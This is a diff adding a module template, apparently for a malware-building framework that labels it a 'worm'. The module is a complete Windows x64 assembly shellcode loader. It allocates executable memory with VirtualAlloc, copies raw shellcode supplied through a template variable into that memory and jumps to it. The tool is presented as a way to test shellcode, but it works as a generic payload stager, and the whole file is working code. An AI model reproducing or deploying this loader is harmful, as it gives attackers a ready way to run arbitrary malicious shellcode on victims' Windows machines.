@@ -1,0 +1,114 @@
+#!name##WinShell64
+#!types##worm
+#!info##[W] [x64] Shellcode testing worm for windows 64 bit. You can paste your shellcode to test it or use a ready-made one.
+#!processWorm##BasicAsm
+#!reqVar##scode##Raw Shellcode. Ex: \x23\x4c\x56 ##str
+#!globalVar##COMPILER_NAME##MC_win64##Compiler name
+#!globalVar##OS_EXEC##win##Target system executable
+#!lang##asm
+#!system_FLAG##[W]
+#!banned##module##starter##shadow##junk
+#!reqVar##GLOBAL_COMPILER_NO_DLL##Whether the compiler should include libraries in the executable. Without the included DLLs, the resulting file takes up very little space.##str
+#!setVar##GLOBAL_COMPILER_NO_DLL##False##str
+
+extern VirtualAlloc
+extern ExitProcess
+extern memcpy
+extern printf
+extern GetLastError
+
+; force RIP-relative addressing
+default rel
+
+section .data
+    shellcode: db {{scode}}
+    shellcode_len: equ $ - shellcode
+    text_exit: db "EXIT PROGRAM", 10, 0
+    text_error: db "ERROR: %d", 10, 0
+    text_label: db "Shellcode executor Win x64 by: github.com/LittleAtariXE", 10, 0
+    text_exe: db "Execute Shellcode. Shellcode len: %d bytes", 10, 0
+
+section .bss
+    mem_pointer resq 1
+    sc_addr resq 1
+    
+section .text
+    global main
+
+main:
+    and rsp, -16
+    call EXECUTOR
+    call EXIT
+
+EXECUTOR:
+    ; show label
+    sub rsp, 32 ;shadow space
+    mov rcx, text_label
+    call printf
+    add rsp, 32 ; restore stack
+
+    ; alloc memory 
+    sub rsp, 32 ; shadow space
+    xor rcx, rcx    ; lpAddress
+    mov rdx, shellcode_len
+    mov r8d, 0x00001000 | 0x00002000
+    mov r9d, 0x40
+
+    call VirtualAlloc
+    add rsp, 32 ; restore stack
+    cmp rax, 0
+    je ERROR
+    ; save memory pointer
+    lea rbx, [mem_pointer]  ;load the address of the variable 'mem_pointer' into the RBX register
+    mov [rbx], rax  ; Moves the value from RAX to the address that RBX points to
+    
+    
+    ; memory copy
+    sub rsp, 32 ; shadow space
+    lea rbx, [mem_pointer]  ;load the address of the variable 'mem_pointer' into the RBX register
+    mov rcx, [rbx]  ;Moves the value from RBX to RCX
+    mov rdx, shellcode
+    mov r8, shellcode_len
+    call memcpy
+    add rsp, 32 ; restore stack
+    cmp rax, 0
+    je ERROR
+    
+    
+    ; save shellcode address
+    lea rbx, [sc_addr]  ;load the address of the variable 'sc_addr' into the RBX register
+    mov [rbx], rax  ; Moves value from RAX to address that RBX points to
+    
+    
+    sub rsp, 32 ; shadow space
+    mov rcx, text_exe
+    mov rdx, shellcode_len
+    call printf
+    add rsp, 32 ; restore stack
+    
+    ;Execute Shellcode
+    lea rbx, [sc_addr]  ;load the address of the variable 'sc_addr' into the RBX register
+    mov rax, [rbx] ; Moves value from RAX to address that RBX points to
+    call rax 
+    ret
+
+EXIT:
+    sub rsp, 32 ; shadow space
+    mov rcx, text_exit
+    call printf
+    add rsp, 32 ; restore stack
+    
+    sub rsp, 32 ;shadow space
+    call ExitProcess
+
+ERROR:
+    sub rsp, 32 ;shadow space
+    call GetLastError
+    add rsp, 32 ; restore stack
+    
+    sub rsp, 32 ; shadow space
+    mov rcx, text_error
+    mov rdx, rax    ; GetLastError return
+    call printf
+    add rsp, 32 ; restore stack
+    jmp EXIT
